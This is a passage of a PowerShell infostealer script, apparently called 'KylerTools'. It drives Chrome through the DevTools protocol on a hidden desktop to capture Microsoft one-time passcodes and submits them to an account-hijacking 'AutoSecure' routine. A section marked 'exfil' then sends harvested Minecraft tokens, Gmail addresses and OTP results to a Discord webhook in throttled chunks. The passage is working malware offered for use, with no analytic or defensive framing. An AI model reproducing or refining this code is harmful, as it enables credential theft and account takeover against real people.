                                $otp = Cdp-Eval -ws $ws -expr $otpJs -id ($idBase + 5)

                                if(-not $otp){
                                    $wsDead = $false
                                    try{ $wsDead = ($ws.State -ne [System.Net.WebSockets.WebSocketState]::Open) } catch { $wsDead = $true }
                                    if($wsDead){
                                        if($reconnects -ge $maxReconnects){ break }
                                        $reconnects++
                                        try{ $ws.Dispose() } catch {}
                                        Start-Sleep 1
                                        $tab = Cdp-NewTab -url $url
                                        if(-not $tab){ Start-Sleep 2; continue }
                                        try{ $ws = Cdp-Session -wsUrl $tab.webSocketDebuggerUrl } catch { Start-Sleep 2; continue }
                                        $idBase = 100 + ($tabSeq * 10); $tabSeq++
                                    }
                                } else { break }
                                Start-Sleep -Seconds $pollIntervalS
                            }

                            if($ws){
                                try{ $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure,"",[Threading.CancellationToken]::None).Wait() } catch {}
                                try{ $ws.Dispose() } catch {}
                            }

                            if(-not $otp){ $otpResults[$e] = "OTP_TIMEOUT"; continue }
                            $sub = AS-Submit -email $e -session $sid -otp $otp
                            $otpResults[$e] = if($sub.ok){ "OK :: $otp" } else { "SUBMIT_FAIL ($($sub.status)) :: $otp" }
                        }
                    } else {
                        foreach($e in $script:gmailList){ $otpResults[$e] = "CDP_UNBOUND" }
                    }
                } else {
                    foreach($e in $script:gmailList){ $otpResults[$e] = "SPAWN_FAIL" }
                }
            }
        }
    }
}
finally {
    foreach($procId in $hiddenPids){
        try{ Stop-Process -Id $procId -Force -EA 0 } catch {}
    }
    Get-CimInstance Win32_Process -Filter "Name='chrome.exe'" -EA 0 |
        Where-Object { $_.CommandLine -and $_.CommandLine -match [regex]::Escape("$env:LOCALAPPDATA\Google\Chrome\User Data") } |
        ForEach-Object { try{ Stop-Process -Id $_.ProcessId -Force -EA 0 } catch {} }

    if($deskHandle -ne [IntPtr]::Zero){ [void][Desk]::CloseDesktop($deskHandle) }
    if($script:CdpBrowserWs){ try{ $script:CdpBrowserWs.Dispose() } catch {} }
}

# ---------- exfil ----------
# FIX: throttle to 2.5s (was 2s) to stay under Discord's 30/60s bucket on
# multi-chunk bursts. Retry-After honored as before.
function Send-Embed {
    param($title, $desc, $color, $footerText)
    $embed = @{ title=$title; description=$bt3+$desc+$bt3; color=$color; timestamp=(Get-Date).ToString("o") }
    if($footerText){ $embed.footer = @{ text=$footerText } }
    $body = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10
    for($i=0; $i -lt 3; $i++){
        try{ iwr -Uri $webhook -Method Post -Headers $h -Body $body -TimeoutSec 8 -EA Stop | Out-Null; return }
        catch{ $w=3; try{ $ra=$_.Exception.Response.Headers['Retry-After']; if($ra){$w=[double]$ra} }catch{}; Start-Sleep -Seconds ($w+1) }
    }
}

# FIX: chunk helper keeps fences balanced by never splitting inside a block.
# Each token block is emitted whole; only the report header text is chunked.
function Split-Chunk {
    param([string]$text, [int]$limit = 1700)
    $out = @()
    for($i=0; $i -lt $text.Length; $i += $limit){ $out += $text.Substring($i, [Math]::Min($limit, $text.Length-$i)) }
    if($out.Count -eq 0){ $out = @("") }
    return $out
}

$limit = 1700

if($found.Count -eq 0){ $mcReport = "nothin found bro" } else {
    $lines = @(); $i = 0
    foreach($t in $found){
        $i++
        # FIX: each token block is a self-contained fenced unit, so a chunk
        # boundary never splits a fence mid-token.
        $lines += ("[ $i ] $($t.User) :: $($t.Type) :: $($t.File)" + $nl + $t.Token)
    }
    $mcReport = $lines -join ($nl + $nl)
}
$chunks = Split-Chunk -text $mcReport -limit $limit
$n=0
foreach($c in $chunks){ $n++; Send-Embed -title "KylerTools | MC Tokens" -desc $c -color 5793266 -footerText "kylertools | part $n/$($chunks.Count)"; Start-Sleep -Milliseconds 2500 }

if($script:gmailList.Count -gt 0){
    $grep = (@("== GMAILS ==") + $script:gmailList) -join $nl
    $gchunks = Split-Chunk -text $grep -limit $limit
    $m=0
    foreach($c in $gchunks){ $m++; Send-Embed -title "KylerTools | GMAILS" -desc $c -color 5793266 -footerText "kylertools gmails | part $m/$($gchunks.Count)"; Start-Sleep -Milliseconds 2500 }
}

if($otpResults.Count -gt 0){
    $ol = @("== AUTOSECURE MS-OTP ==")
    foreach($e in $script:gmailList){
        $raw = [string]$otpResults[$e]
        if(-not $raw){ $raw = "no_result" }
        $ol += "$e :: $raw"
    }
    $orep = $ol -join $nl
    $ochunks = Split-Chunk -text $orep -limit $limit
    $k=0
    foreach($c in $ochunks){ $k++; Send-Embed -title "KylerTools | MS-OTP" -desc $c -color 5793266 -footerText "kylertools otp | part $k/$($ochunks.Count)"; Start-Sleep -Milliseconds 2500 }
}

if($asTrace.Count -gt 0){
    $tl = @("== AUTOSECURE API TRACE ==")
    foreach($t in $asTrace){ $tl += "$($t.Email) :: $($t.Call) :: $($t.Status)" }
    $trep = $tl -join $nl
    $tchunks = Split-Chunk -text $trep -limit $limit
    $j=0
    foreach($c in $tchunks){ $j++; Send-Embed -title "KylerTools | API TRACE" -desc $c -color 3447003 -footerText "kylertools trace | part $j/$($tchunks.Count)"; Start-Sleep -Milliseconds 2500 }
}
